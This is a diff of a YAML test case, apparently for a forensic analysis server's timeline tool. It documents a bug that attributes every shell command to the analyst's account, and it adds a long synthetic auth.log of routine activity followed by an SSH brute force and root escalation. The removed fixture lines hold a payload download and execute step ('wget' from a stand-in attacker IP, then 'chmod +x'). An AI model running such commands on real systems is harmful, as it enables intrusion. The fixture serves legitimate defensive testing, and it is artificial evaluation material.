@@ -1,37 +1,629 @@
 # Matrix case P4107-006: build_timeline takes the bash actor from the first
-# "home" path segment of the absolute path, so a case stored under
-# /.../home/<name>/ gives every bash event that name.
+# "home" segment of the absolute path of each .bash_history, so a case stored
+# under /home/<analyst>/ gives every bash event the analyst's name.
+#
+# findevil's README installs the server by cloning it on a SIFT Workstation
+# (whose default account is sansforensics, see the README's
+# /home/sansforensics/findevil path) and copies cases into ./evidence, the
+# default FINDEVIL_EVIDENCE_DIR. The case below sits at that place:
+# home/sansforensics/findevil/evidence/web-prod-02.
+#
+# The case is an Ubuntu web server: eight days of normal work by alice (SRE)
+# and deploy (CI account), timestamped shell histories (HISTTIMEFORMAT is set
+# in /etc/profile.d), and on 2026-04-14 an SSH brute force on deploy from
+# 203.0.113.7, a payload download in deploy's shell, sudo -i to root, and
+# persistence (cron.d, a new sudo user) in root's shell.
 case_id: P4107-006
 problem: P4107
 server: findevil
 variant: findevil-d1a8d25
 commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
 display: response
-level: mcp
-realism: possible
-realism_ko: "분석가가 사건 폴더를 자기 홈 폴더 아래에 두는 일은 있지만, 표준 위치는 아니다."
+level: model
+realism: common
+realism_ko: "findevil README는 SIFT Workstation(기본 계정 `sansforensics`)의 홈 폴더에 저장소를 받고 사건을 `./evidence`에 복사하게 안내한다. 그래서 기본 설치대로 쓰면 사건 폴더가 늘 `/home/sansforensics/` 아래에 있다."
 coverage: full
-summary: When the case folder sits under home/analyst/, commands from fs/home/alice/.bash_history and fs/root/.bash_history are both attributed to "analyst", and provenance only says ".bash_history:N", so the real owner cannot be recovered.
-summary_ko: "사건 폴더가 `home/analyst/` 아래에 있으면 `fs/home/alice/.bash_history`와 `fs/root/.bash_history`의 명령이 모두 \"analyst\"의 것이 된다. 출처는 \".bash_history:N\"으로만 나와 실제 소유자를 되찾을 수 없다."
-defect_ko: "이 서버는 절대 경로에서 처음 나오는 `home` 다음 이름을 사용자로 쓴다. 증거 안에서 기록 파일이 있는 홈 폴더로 정해야 한다. 모델은 alice와 root의 명령을 모두 분석가 `analyst`가 한 것으로 잘못 안다."
-setup_ko: "사건 폴더를 `home/analyst/case`에 두고 그 안에 alice와 root의 `.bash_history`를 넣었다."
+summary: With the case in findevil's default evidence folder under /home/sansforensics/, build_timeline labels all 158 shell commands of deploy, alice and root, including the attacker's wget, chmod, cron and useradd, as run by "sansforensics", an account that does not exist on the host; provenance only says ".bash_history:N", so the owner cannot be recovered from the table.
+summary_ko: "사건을 findevil 기본 증거 폴더(`/home/sansforensics/` 아래)에 두면 `build_timeline`은 deploy·alice·root의 셸 명령 158건(공격자의 `wget`·`chmod`·cron·`useradd` 포함)을 모두 호스트에 없는 계정 \"sansforensics\"가 실행한 것으로 적는다. 출처는 \".bash_history:N\"뿐이라 표만으로는 실제 소유자를 되찾을 수 없다."
+defect_ko: "이 서버는 절대 경로에서 처음 나오는 `home` 다음 이름을 사용자로 쓴다. 증거 안에서 기록 파일이 있는 홈 폴더로 정해야 한다. 모델은 공격자 명령을 분석가 계정 `sansforensics`가 실행한 것으로 잘못 안다."
+setup_ko: "README 기본 설치처럼 사건 폴더를 `home/sansforensics/findevil/evidence/web-prod-02`에 두었다. 그 안에 8일 동안의 정상 작업(alice·deploy·root 셸 기록, auth.log)과, 4월 14일 deploy 계정 무차별 대입 → deploy 셸에서 페이로드 내려받기 → `sudo -i` → root 셸에서 cron·계정 추가로 이어지는 침입을 넣었다."
 fixture:
-  - path: home/analyst/case/fs/home/alice/.bash_history
-    text: "#1775971800\nwget http://203.0.113.7/x\n"
-  - path: home/analyst/case/fs/root/.bash_history
-    text: "#1775972100\nchmod +x /tmp/x\n"
+  - path: home/sansforensics/findevil/evidence/web-prod-02/auth.log
+    text: |
+      Apr  6 00:17:01 web-prod-02 CRON[31007]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  6 00:17:02 web-prod-02 CRON[31007]: pam_unix(cron:session): session closed for user root
+      Apr  6 06:17:01 web-prod-02 CRON[31014]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  6 06:17:02 web-prod-02 CRON[31014]: pam_unix(cron:session): session closed for user root
+      Apr  6 09:23:06 web-prod-02 sshd[31237]: Accepted publickey for alice from 10.0.2.15 port 45504 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr  6 09:23:06 web-prod-02 sshd[31237]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr  6 09:24:04 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+      Apr  6 09:26:55 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+      Apr  6 11:35:24 web-prod-02 sshd[31458]: Accepted publickey for deploy from 10.0.1.50 port 59483 ssh2: RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcde
+      Apr  6 11:35:24 web-prod-02 sshd[31458]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+      Apr  6 12:17:01 web-prod-02 CRON[31021]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  6 12:17:02 web-prod-02 CRON[31021]: pam_unix(cron:session): session closed for user root
+      Apr  6 15:03:00 web-prod-02 sshd[31250]: Accepted publickey for alice from 10.0.2.15 port 51447 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr  6 15:03:00 web-prod-02 sshd[31250]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr  6 15:03:20 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/nginx/access.log
+      Apr  6 15:05:27 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/nginx/access.log
+      Apr  6 18:17:01 web-prod-02 CRON[31028]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  6 18:17:02 web-prod-02 CRON[31028]: pam_unix(cron:session): session closed for user root
+      Apr  7 00:17:01 web-prod-02 CRON[31035]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  7 00:17:02 web-prod-02 CRON[31035]: pam_unix(cron:session): session closed for user root
+      Apr  7 06:17:01 web-prod-02 CRON[31042]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  7 06:17:02 web-prod-02 CRON[31042]: pam_unix(cron:session): session closed for user root
+      Apr  7 09:07:12 web-prod-02 sshd[31263]: Accepted publickey for alice from 10.0.2.15 port 43557 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr  7 09:07:12 web-prod-02 sshd[31263]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr  7 09:07:32 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/sites-available/app.conf
+      Apr  7 09:08:13 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/sbin/nginx -t
+      Apr  7 09:08:31 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+      Apr  7 09:08:46 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+      Apr  7 09:08:57 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+      Apr  7 09:49:54 web-prod-02 sshd[31276]: Accepted publickey for alice from 10.0.2.15 port 52118 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr  7 09:49:54 web-prod-02 sshd[31276]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr  7 09:50:14 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
+      Apr  7 11:41:36 web-prod-02 sshd[31471]: Accepted publickey for deploy from 10.0.1.50 port 55712 ssh2: RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcde
+      Apr  7 11:41:36 web-prod-02 sshd[31471]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+      Apr  7 12:17:01 web-prod-02 CRON[31049]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  7 12:17:02 web-prod-02 CRON[31049]: pam_unix(cron:session): session closed for user root
+      Apr  7 15:31:20 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+      Apr  7 15:31:56 web-prod-02 sshd[31289]: Accepted publickey for alice from 10.0.2.15 port 45930 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr  7 15:31:56 web-prod-02 sshd[31289]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr  7 18:17:01 web-prod-02 CRON[31056]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  7 18:17:02 web-prod-02 CRON[31056]: pam_unix(cron:session): session closed for user root
+      Apr  8 00:17:01 web-prod-02 CRON[31063]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  8 00:17:02 web-prod-02 CRON[31063]: pam_unix(cron:session): session closed for user root
+      Apr  8 06:17:01 web-prod-02 CRON[31070]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  8 06:17:02 web-prod-02 CRON[31070]: pam_unix(cron:session): session closed for user root
+      Apr  8 09:13:50 web-prod-02 sshd[31302]: Accepted publickey for alice from 10.0.2.15 port 45676 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr  8 09:13:50 web-prod-02 sshd[31302]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr  8 11:14:24 web-prod-02 sshd[31484]: Accepted publickey for deploy from 10.0.1.50 port 50725 ssh2: RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcde
+      Apr  8 11:14:24 web-prod-02 sshd[31484]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+      Apr  8 12:17:01 web-prod-02 CRON[31077]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  8 12:17:02 web-prod-02 CRON[31077]: pam_unix(cron:session): session closed for user root
+      Apr  8 15:10:29 web-prod-02 sshd[31315]: Accepted publickey for alice from 10.0.2.15 port 53700 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr  8 15:10:29 web-prod-02 sshd[31315]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr  8 18:17:01 web-prod-02 CRON[31084]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  8 18:17:02 web-prod-02 CRON[31084]: pam_unix(cron:session): session closed for user root
+      Apr  9 00:17:01 web-prod-02 CRON[31091]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  9 00:17:02 web-prod-02 CRON[31091]: pam_unix(cron:session): session closed for user root
+      Apr  9 06:17:01 web-prod-02 CRON[31098]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  9 06:17:02 web-prod-02 CRON[31098]: pam_unix(cron:session): session closed for user root
+      Apr  9 09:02:15 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/sbin/nginx -t
+      Apr  9 09:03:07 web-prod-02 sshd[31328]: Accepted publickey for alice from 10.0.2.15 port 56065 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr  9 09:03:07 web-prod-02 sshd[31328]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr  9 11:38:42 web-prod-02 sshd[31497]: Accepted publickey for deploy from 10.0.1.50 port 49819 ssh2: RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcde
+      Apr  9 11:38:42 web-prod-02 sshd[31497]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+      Apr  9 12:17:01 web-prod-02 CRON[31105]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  9 12:17:02 web-prod-02 CRON[31105]: pam_unix(cron:session): session closed for user root
+      Apr  9 15:18:06 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/sites-available/app.conf
+      Apr  9 15:18:20 web-prod-02 sshd[31341]: Accepted publickey for alice from 10.0.2.15 port 43337 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr  9 15:18:20 web-prod-02 sshd[31341]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr  9 18:17:01 web-prod-02 CRON[31112]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr  9 18:17:02 web-prod-02 CRON[31112]: pam_unix(cron:session): session closed for user root
+      Apr 10 00:17:01 web-prod-02 CRON[31119]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 00:17:02 web-prod-02 CRON[31119]: pam_unix(cron:session): session closed for user root
+      Apr 10 06:17:01 web-prod-02 CRON[31126]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 06:17:02 web-prod-02 CRON[31126]: pam_unix(cron:session): session closed for user root
+      Apr 10 09:33:07 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+      Apr 10 09:33:15 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+      Apr 10 09:34:11 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/sites-available/app.conf
+      Apr 10 09:35:19 web-prod-02 sshd[31354]: Accepted publickey for alice from 10.0.2.15 port 48206 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr 10 09:35:19 web-prod-02 sshd[31354]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr 10 09:51:22 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
+      Apr 10 11:19:53 web-prod-02 sshd[31510]: Accepted publickey for deploy from 10.0.1.50 port 59955 ssh2: RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcde
+      Apr 10 11:19:53 web-prod-02 sshd[31510]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+      Apr 10 11:24:13 web-prod-02 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+      Apr 10 12:17:01 web-prod-02 CRON[31133]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 12:17:02 web-prod-02 CRON[31133]: pam_unix(cron:session): session closed for user root
+      Apr 10 15:16:46 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/sbin/nginx -t
+      Apr 10 15:18:13 web-prod-02 sshd[31367]: Accepted publickey for alice from 10.0.2.15 port 54602 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr 10 15:18:13 web-prod-02 sshd[31367]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr 10 15:19:05 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/sites-available/app.conf
+      Apr 10 18:17:01 web-prod-02 CRON[31140]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 18:17:02 web-prod-02 CRON[31140]: pam_unix(cron:session): session closed for user root
+      Apr 11 00:17:01 web-prod-02 CRON[31147]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 00:17:02 web-prod-02 CRON[31147]: pam_unix(cron:session): session closed for user root
+      Apr 11 06:17:01 web-prod-02 CRON[31154]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 06:17:02 web-prod-02 CRON[31154]: pam_unix(cron:session): session closed for user root
+      Apr 11 09:40:43 web-prod-02 sshd[31380]: Accepted publickey for alice from 10.0.2.15 port 52628 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr 11 09:40:43 web-prod-02 sshd[31380]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr 11 09:41:54 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/nginx/access.log
+      Apr 11 11:41:30 web-prod-02 sshd[31523]: Accepted publickey for deploy from 10.0.1.50 port 56347 ssh2: RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcde
+      Apr 11 11:41:30 web-prod-02 sshd[31523]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+      Apr 11 12:17:01 web-prod-02 CRON[31161]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 12:17:02 web-prod-02 CRON[31161]: pam_unix(cron:session): session closed for user root
+      Apr 11 15:42:59 web-prod-02 sshd[31393]: Accepted publickey for alice from 10.0.2.15 port 55339 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr 11 15:42:59 web-prod-02 sshd[31393]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr 11 15:43:19 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/nginx/access.log
+      Apr 11 18:17:01 web-prod-02 CRON[31168]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 18:17:02 web-prod-02 CRON[31168]: pam_unix(cron:session): session closed for user root
+      Apr 12 00:17:01 web-prod-02 CRON[31175]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 00:17:02 web-prod-02 CRON[31175]: pam_unix(cron:session): session closed for user root
+      Apr 12 06:17:01 web-prod-02 CRON[31182]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 06:17:02 web-prod-02 CRON[31182]: pam_unix(cron:session): session closed for user root
+      Apr 12 09:31:47 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+      Apr 12 09:32:46 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+      Apr 12 09:32:53 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/sites-available/app.conf
+      Apr 12 09:33:19 web-prod-02 sshd[31406]: Accepted publickey for alice from 10.0.2.15 port 48862 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr 12 09:33:19 web-prod-02 sshd[31406]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr 12 09:33:39 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+      Apr 12 11:01:13 web-prod-02 sshd[31536]: Accepted publickey for deploy from 10.0.1.50 port 48690 ssh2: RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcde
+      Apr 12 11:01:13 web-prod-02 sshd[31536]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+      Apr 12 12:17:01 web-prod-02 CRON[31189]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 12:17:02 web-prod-02 CRON[31189]: pam_unix(cron:session): session closed for user root
+      Apr 12 15:04:16 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/nginx/access.log
+      Apr 12 15:06:44 web-prod-02 sshd[31419]: Accepted publickey for alice from 10.0.2.15 port 48601 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr 12 15:06:44 web-prod-02 sshd[31419]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr 12 18:17:01 web-prod-02 CRON[31196]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 18:17:02 web-prod-02 CRON[31196]: pam_unix(cron:session): session closed for user root
+      Apr 13 00:17:01 web-prod-02 CRON[31203]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 00:17:02 web-prod-02 CRON[31203]: pam_unix(cron:session): session closed for user root
+      Apr 13 06:17:01 web-prod-02 CRON[31210]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 06:17:02 web-prod-02 CRON[31210]: pam_unix(cron:session): session closed for user root
+      Apr 13 09:36:04 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/sites-available/app.conf
+      Apr 13 09:37:15 web-prod-02 sshd[31432]: Accepted publickey for alice from 10.0.2.15 port 43191 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr 13 09:37:15 web-prod-02 sshd[31432]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr 13 09:50:50 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
+      Apr 13 11:18:54 web-prod-02 sshd[31549]: Accepted publickey for deploy from 10.0.1.50 port 49124 ssh2: RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcde
+      Apr 13 11:18:54 web-prod-02 sshd[31549]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+      Apr 13 11:23:03 web-prod-02 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+      Apr 13 12:17:01 web-prod-02 CRON[31217]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 12:17:02 web-prod-02 CRON[31217]: pam_unix(cron:session): session closed for user root
+      Apr 13 15:06:29 web-prod-02 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+      Apr 13 15:07:42 web-prod-02 sshd[31445]: Accepted publickey for alice from 10.0.2.15 port 50199 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrStUvWx0123456789abcd
+      Apr 13 15:07:42 web-prod-02 sshd[31445]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+      Apr 13 18:17:01 web-prod-02 CRON[31224]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 18:17:02 web-prod-02 CRON[31224]: pam_unix(cron:session): session closed for user root
+      Apr 14 02:03:07 web-prod-02 sshd[31552]: Failed password for deploy from 203.0.113.7 port 31890 ssh2
+      Apr 14 02:03:22 web-prod-02 sshd[31555]: Failed password for deploy from 203.0.113.7 port 61186 ssh2
+      Apr 14 02:03:37 web-prod-02 sshd[31558]: Failed password for deploy from 203.0.113.7 port 41557 ssh2
+      Apr 14 02:03:52 web-prod-02 sshd[31561]: Failed password for deploy from 203.0.113.7 port 58873 ssh2
+      Apr 14 02:04:07 web-prod-02 sshd[31564]: Failed password for deploy from 203.0.113.7 port 46246 ssh2
+      Apr 14 02:04:22 web-prod-02 sshd[31567]: Failed password for deploy from 203.0.113.7 port 42604 ssh2
+      Apr 14 02:04:37 web-prod-02 sshd[31570]: Failed password for deploy from 203.0.113.7 port 36844 ssh2
+      Apr 14 02:04:52 web-prod-02 sshd[31573]: Failed password for deploy from 203.0.113.7 port 35345 ssh2
+      Apr 14 02:05:07 web-prod-02 sshd[31576]: Failed password for deploy from 203.0.113.7 port 58532 ssh2
+      Apr 14 02:05:22 web-prod-02 sshd[31579]: Failed password for deploy from 203.0.113.7 port 56749 ssh2
+      Apr 14 02:05:37 web-prod-02 sshd[31582]: Failed password for deploy from 203.0.113.7 port 58941 ssh2
+      Apr 14 02:05:52 web-prod-02 sshd[31585]: Failed password for deploy from 203.0.113.7 port 32743 ssh2
+      Apr 14 02:06:07 web-prod-02 sshd[31588]: Failed password for deploy from 203.0.113.7 port 64050 ssh2
+      Apr 14 02:06:22 web-prod-02 sshd[31591]: Failed password for deploy from 203.0.113.7 port 38889 ssh2
+      Apr 14 02:06:37 web-prod-02 sshd[31594]: Failed password for deploy from 203.0.113.7 port 37433 ssh2
+      Apr 14 02:06:52 web-prod-02 sshd[31597]: Failed password for deploy from 203.0.113.7 port 55587 ssh2
+      Apr 14 02:07:07 web-prod-02 sshd[31600]: Failed password for deploy from 203.0.113.7 port 62834 ssh2
+      Apr 14 02:07:22 web-prod-02 sshd[31603]: Failed password for deploy from 203.0.113.7 port 51947 ssh2
+      Apr 14 02:07:37 web-prod-02 sshd[31606]: Failed password for deploy from 203.0.113.7 port 57958 ssh2
+      Apr 14 02:07:52 web-prod-02 sshd[31609]: Failed password for deploy from 203.0.113.7 port 57421 ssh2
+      Apr 14 02:08:07 web-prod-02 sshd[31612]: Failed password for deploy from 203.0.113.7 port 55188 ssh2
+      Apr 14 02:08:22 web-prod-02 sshd[31615]: Failed password for deploy from 203.0.113.7 port 51401 ssh2
+      Apr 14 02:08:37 web-prod-02 sshd[31618]: Failed password for deploy from 203.0.113.7 port 61536 ssh2
+      Apr 14 02:08:52 web-prod-02 sshd[31621]: Failed password for deploy from 203.0.113.7 port 52575 ssh2
+      Apr 14 02:09:07 web-prod-02 sshd[31624]: Failed password for deploy from 203.0.113.7 port 52272 ssh2
+      Apr 14 02:09:22 web-prod-02 sshd[31627]: Failed password for deploy from 203.0.113.7 port 58146 ssh2
+      Apr 14 02:09:37 web-prod-02 sshd[31630]: Failed password for deploy from 203.0.113.7 port 56867 ssh2
+      Apr 14 02:09:52 web-prod-02 sshd[31633]: Failed password for deploy from 203.0.113.7 port 57113 ssh2
+      Apr 14 02:10:07 web-prod-02 sshd[31636]: Failed password for deploy from 203.0.113.7 port 47169 ssh2
+      Apr 14 02:10:22 web-prod-02 sshd[31639]: Failed password for deploy from 203.0.113.7 port 55958 ssh2
+      Apr 14 02:10:37 web-prod-02 sshd[31642]: Failed password for deploy from 203.0.113.7 port 56143 ssh2
+      Apr 14 02:10:52 web-prod-02 sshd[31645]: Failed password for deploy from 203.0.113.7 port 63779 ssh2
+      Apr 14 02:11:07 web-prod-02 sshd[31648]: Failed password for deploy from 203.0.113.7 port 39272 ssh2
+      Apr 14 02:11:22 web-prod-02 sshd[31651]: Failed password for deploy from 203.0.113.7 port 41012 ssh2
+      Apr 14 02:11:37 web-prod-02 sshd[31654]: Failed password for deploy from 203.0.113.7 port 31134 ssh2
+      Apr 14 02:11:52 web-prod-02 sshd[31657]: Failed password for deploy from 203.0.113.7 port 56430 ssh2
+      Apr 14 02:12:07 web-prod-02 sshd[31660]: Failed password for deploy from 203.0.113.7 port 30205 ssh2
+      Apr 14 02:12:22 web-prod-02 sshd[31663]: Failed password for deploy from 203.0.113.7 port 32474 ssh2
+      Apr 14 02:12:37 web-prod-02 sshd[31666]: Failed password for deploy from 203.0.113.7 port 49179 ssh2
+      Apr 14 02:12:52 web-prod-02 sshd[31669]: Failed password for deploy from 203.0.113.7 port 57515 ssh2
+      Apr 14 02:13:07 web-prod-02 sshd[31672]: Failed password for deploy from 203.0.113.7 port 51758 ssh2
+      Apr 14 02:13:22 web-prod-02 sshd[31675]: Failed password for deploy from 203.0.113.7 port 40837 ssh2
+      Apr 14 02:13:37 web-prod-02 sshd[31678]: Failed password for deploy from 203.0.113.7 port 48811 ssh2
+      Apr 14 02:13:52 web-prod-02 sshd[31681]: Failed password for deploy from 203.0.113.7 port 63942 ssh2
+      Apr 14 02:14:07 web-prod-02 sshd[31684]: Failed password for deploy from 203.0.113.7 port 58082 ssh2
+      Apr 14 02:14:22 web-prod-02 sshd[31687]: Failed password for deploy from 203.0.113.7 port 55020 ssh2
+      Apr 14 02:15:22 web-prod-02 sshd[31690]: Accepted password for deploy from 203.0.113.7 port 51722 ssh2
+      Apr 14 02:15:22 web-prod-02 sshd[31690]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+      Apr 14 02:15:56 web-prod-02 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=list
+      Apr 14 02:16:23 web-prod-02 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
